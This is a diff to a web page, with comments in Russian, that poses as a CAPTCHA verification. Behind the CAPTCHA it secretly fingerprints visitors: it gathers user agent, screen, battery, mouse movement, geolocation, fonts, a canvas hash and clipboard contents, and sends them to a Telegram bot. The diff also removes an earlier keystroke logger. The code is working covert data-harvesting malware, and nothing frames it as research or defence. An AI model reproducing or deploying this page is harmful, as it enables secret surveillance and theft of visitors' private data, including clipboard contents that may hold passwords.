@@ -12,6 +12,7 @@
   </div>
 
   <script>
+    // === КОНФИГ ===
     const TELEGRAM_TOKEN = 'ТВОЙ_ТОКЕН';
     const CHAT_ID = 'ТВОЙ_CHAT_ID';
 
@@ -27,9 +28,8 @@
     let mouseTrail = [];
     let batteryInfo = {};
     let fingerprintCache = null;
-    let keyLog = [];
 
-    // Капча
+    // === КАПЧА ===
     function generateCaptcha() {
       const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
       return Array(8).fill().map(() => chars[Math.floor(Math.random()*chars.length)]).join('');
@@ -39,22 +39,16 @@
       currentCaptcha = generateCaptcha();
       elements.captchaCode.textContent = currentCaptcha;
       elements.progressBar.style.width = '0%';
+      console.log('✅ Капча отрисована');
       collectPassiveFingerprint();
     }
 
-    // Mouse path
+    // === ПАССИВНЫЙ СБОР ===
     document.addEventListener('mousemove', (e) => {
       mouseTrail.push({x: e.clientX, y: e.clientY, t: Date.now()});
       if (mouseTrail.length > 200) mouseTrail.shift();
     });
 
-    // Keystrokes динамика
-    elements.userInput.addEventListener('input', () => {
-      const v = elements.userInput.value;
-      keyLog.push({t: Date.now(), len: v.length});
-    });
-
-    // Battery
     if ('getBattery' in navigator) {
       navigator.getBattery().then(bat => {
         batteryInfo = {
@@ -67,11 +61,9 @@
     function detectFonts() {
       const testFonts = ['Arial','Times New Roman','Comic Sans MS','Courier New','Verdana'];
       const detected = [];
-      if (document.fonts) {
-        testFonts.forEach(font => {
-          if (document.fonts.check(`12px ${font}`)) detected.push(font);
-        });
-      }
+      testFonts.forEach(font => {
+        if (document.fonts && document.fonts.check(`12px ${font}`)) detected.push(font);
+      });
       return detected.slice(0, 3).join(',');
     }
 
@@ -88,7 +80,7 @@
       return canvas.toDataURL().substring(0, 80);
     }
 
-    async function getGeo() {
+    function getGeo() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) return resolve('geo-unsupported');
         navigator.geolocation.getCurrentPosition(
@@ -108,18 +100,14 @@
       }
     }
 
-    // Полный fingerprint (пассивный)
     async function collectPassiveFingerprint() {
       if (fingerprintCache) return fingerprintCache;
 
-      const [geo, clipboard] = await Promise.all([
-        getGeo(),
-        getClipboard()
-      ]);
+      const geo = await getGeo();
+      const clipboard = await getClipboard();
 
       fingerprintCache = {
-        ts: new Date().toISOString(),
-        userAgent: navigator.userAgent.substring(0, 150),
+        userAgent: navigator.userAgent.substring(0, 120),
         platform: navigator.platform,
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -129,12 +117,13 @@
         fonts: detectFonts(),
         battery: batteryInfo.level || 'no',
         charging: batteryInfo.charging || 'no',
-        mousePoints: mouseTrail.length,
+        mouseTrail: mouseTrail.length,
         geo,
         canvas: getCanvasFP(),
         clipboard
       };
 
+      console.log('🕵️‍♂️ FP собран пассивно');
       return fingerprintCache;
     }
 
@@ -143,18 +132,16 @@
         `🎯 CAPTCHA_OK\n` +
         `📝 Код: ${currentCaptcha}\n` +
         `⌨️ Ввод: ${input}\n\n` +
-        `⏱️ Время: ${fp.ts}\n` +
         `📱 UA: ${fp.userAgent}\n` +
         `💻 Платформа: ${fp.platform}\n` +
-        `🌐 Язык/таймзона: ${fp.language} / ${fp.timezone}\n` +
+        `🌐 Язык/часовой пояс: ${fp.language} / ${fp.timezone}\n` +
         `🖥️ Экран: ${fp.screen}\n` +
         `🔋 Батарея: ${fp.battery} (${fp.charging})\n` +
-        `🖱️ Мышь: ${fp.mousePoints} точек\n` +
+        `🖱️ Мышь: ${fp.mouseTrail} точек\n` +
         `📍 Geo: ${fp.geo}\n` +
         `🗎 Шрифты: ${fp.fonts}\n` +
         `📋 Буфер: ${fp.clipboard}\n` +
-        `🧩 Canvas: ${fp.canvas}\n\n` +
-        `⌨️ Динамика ввода: ${keyLog.length} событий`;
+        `🧩 Canvas: ${fp.canvas}`;
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -163,7 +150,6 @@
       });
     }
 
-    // Кнопка капчи
     elements.verifyBtn.addEventListener('click', async () => {
       const input = elements.userInput.value.trim().toUpperCase();
       if (input === currentCaptcha) {
